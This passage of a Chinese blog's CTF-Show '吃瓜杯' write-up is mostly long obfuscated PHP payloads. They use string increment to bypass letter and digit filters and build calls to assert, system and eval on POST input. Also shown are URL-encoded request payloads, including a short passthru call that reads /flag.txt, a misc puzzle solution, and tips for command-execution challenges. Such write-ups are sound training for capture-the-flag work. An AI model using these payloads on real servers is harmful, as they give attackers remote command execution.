class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_])); // ASSERT(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure>
+
+<p><strong>system()</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$_</span>=C;//<span class="variable">$_</span>=<span class="variable">$_</span>[0]; //Cprint_r(<span class="variable">$_</span>);<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>; // Sprint_r(<span class="variable">$__</span>);//<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // Y<span class="variable">$___</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Sprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Tprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Eprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Mprint_r(<span class="variable">$__</span>);print_r(<span class="variable">$___</span>); //SYSTEM<span class="variable">$____</span>=_;<span class="variable">$__</span>=<span class="variable">$_</span>;//print_r(<span class="variable">$_</span>);<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$____</span>);//_POSTprint_r(<span class="variable">$___</span>);//SYSTEM<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_])); // SYSTEM(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php//<span class="variable">$_</span>=[C];<span class="variable">$_</span>=<span class="variable">$_</span>[0];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_]));//<span class="variable">$_</span>=C;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=_;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_]));highlight_file(__FILE__);<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];<span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;	<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;	<span class="built_in">eval</span>(<span class="variable">$a</span>);&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get?looklook=1#postctf[show=%24_%3DC%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___%3D%24__%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B&amp;_=ls;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>长度限制：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get?looklook=1&amp;1=passthru&amp;2=tac /flag.txt# postctf[show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)&#123;0&#125;;$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$&#123;$_&#125;&#123;1&#125;($&#123;$_&#125;&#123;2&#125;);</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="吃瓜"><a href="#吃瓜" class="headerlink" title="吃瓜"></a>吃瓜</h2><p><img src="https://i.loli.net/2021/08/14/Rn7LtWDXEldPBp3.png" alt="image-20210814215714938"></p>
+<p>50 4B 03 04 ZIP文件</p>
+<p><img src="https://i.loli.net/2021/08/14/KY4lPejVoOUiqbt.png" alt="image-20210814215832498"></p>
+<p><img src="https://i.loli.net/2021/08/14/LiNXRJ9SHnwVtEz.png" alt="image-20210814220223592"></p>
+<p>这是用来迷惑的</p>
+<p>存在一个文本文档，是个 图片，浏览器访问</p>
+<p><img src="https://i.loli.net/2021/08/16/78L6POtr1spjlBE.png" alt="image-20210816210645822"></p>
+<p>扫描得到    cfhwc19abika_etso{h_u_e_ui1}</p>
+<p>查看图片属性</p>
+<p><img src="https://i.loli.net/2021/08/16/M1JngkVhvbPIDOC.png" alt="image-20210816211218664"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">✿❇✼❄✿❇✼❂❃❆✿✽❂❁❉✼==<span class="comment"># 不知道怎末用</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/16/FyR5WpEugQI9ShK.png" alt="image-20210816211549442"></p>
+<h1 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h1><h2 id="命令执行做题思路"><a href="#命令执行做题思路" class="headerlink" title="命令执行做题思路"></a>命令执行做题思路</h2><ol>
+<li><p>一眼就有思路的直接掠过</p>
+</li>
+<li><p>一眼没有思路的，首先根据正则的过滤分类，决定思路</p>
+<ul>
+<li><p>有回显？无回显？ eval    exec</p>
+</li>
+<li><p>eval  还是  system</p>
+</li>
+<li><p>无字母数字类？</p>
+<p>异或？或？取反？自增？</p>
+</li>
+<li><p>过滤 ;</p>
+</li>
+<li><p>过滤 ‘ ‘    “ “</p>
+</li>
+<li><p>找 phpinfo() 看被 ban 的函数名</p>
+</li>
+</ul>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div id="donation_div"></div>
+
+
+<script src="/js/vdonate.js"></script>
+
+<script>
+var a = new Donate({
+  title: '如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作!', // 可选参数，打赏标题
+  btnText: 'Donate', // 可选参数，打赏按钮文字
+  el: document.getElementById('donation_div'),
+  wechatImage: 'https://i.loli.net/2021/07/09/UNXc5a6nbWxgzru.png',
+  alipayImage: 'https://i.loli.net/2021/07/09/Sf9nJd8hkOypTar.png'
+});
+</script>
+      
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>Post author:  </strong>xizhi-future</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>Post link:  </strong>
+          <a href="/2021/10/01/CTF-Show-吃瓜杯/" target="_blank" title="CTF-Show-吃瓜杯">https://xizhi-future.github.io/2021/10/01/CTF-Show-吃瓜杯/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>Copyright Notice:   </strong>
+            All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            unless stating additionally.
+          </li>
+         
+        </ul>
+<div>
+
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+      
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/10/01/%E8%83%A1%E9%80%82%E4%B8%8E%E6%B1%9F%E5%86%AC%E7%A7%80/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          胡适与江冬秀
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/10/01/CTF-Show-Misc%E5%85%A5%E9%97%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CTF-Show-Misc入门</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF"><span class="nav-number">1.</span> <span class="nav-text">CTF Show 吃瓜杯</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%83%AD%E8%BA%AB"><span class="nav-number">1.1.</span> <span class="nav-text">热身</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ATTup"><span class="nav-number">1.2.</span> <span class="nav-text">ATTup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AD%94%E5%A5%B3"><span class="nav-number">1.3.</span> <span class="nav-text">魔女</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellme-Revenge"><span class="nav-number">1.4.</span> <span class="nav-text">shellme_Revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%83%E7%93%9C"><span class="nav-number">1.5.</span> <span class="nav-text">吃瓜</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">2.</span> <span class="nav-text">二、总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">2.1.</span> <span class="nav-text">命令执行做题思路</span></a></li></ol></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2013 - 2021 忆 执 昔 来 的 旅 途 All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/essayists" class="mobile-nav-link">Essayists</a>
+  
+    <a href="/friendly-links" class="mobile-nav-link">Friendly-links</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
